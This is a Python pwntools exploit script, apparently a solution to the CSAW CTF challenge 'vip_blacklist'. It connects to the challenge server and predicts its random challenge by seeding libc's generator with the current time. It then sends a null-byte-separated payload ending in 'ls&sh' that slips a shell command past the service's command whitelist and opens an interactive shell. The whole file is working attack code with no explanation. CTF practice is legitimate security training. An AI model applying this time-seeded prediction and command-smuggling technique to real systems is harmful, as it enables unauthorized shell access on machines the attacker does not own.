from pwn import *
from ctypes import *
from time import *

context.log_level = 'debug'

#p = process("./vip_blacklist")
p = remote("vip-blacklist.ctf.csaw.io", 9999)

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
libc.srand(libc.time(0))

random_ten = ''
for i in range(10):
    random_ten += chr(libc.rand() & 0xFF)

def choose_menu(string):
    p.recvuntil(b"Commands")
    p.recvline()
    p.sendline(string)

choose_menu(random_ten)

payload = "queue" + '\x00' + "clear" + '\x00' + "exit" + '\x00\x00' + "ls&sh"
log.info(hex(len(payload)))
choose_menu(payload)

choose_menu("ls&sh")

p.interactive()
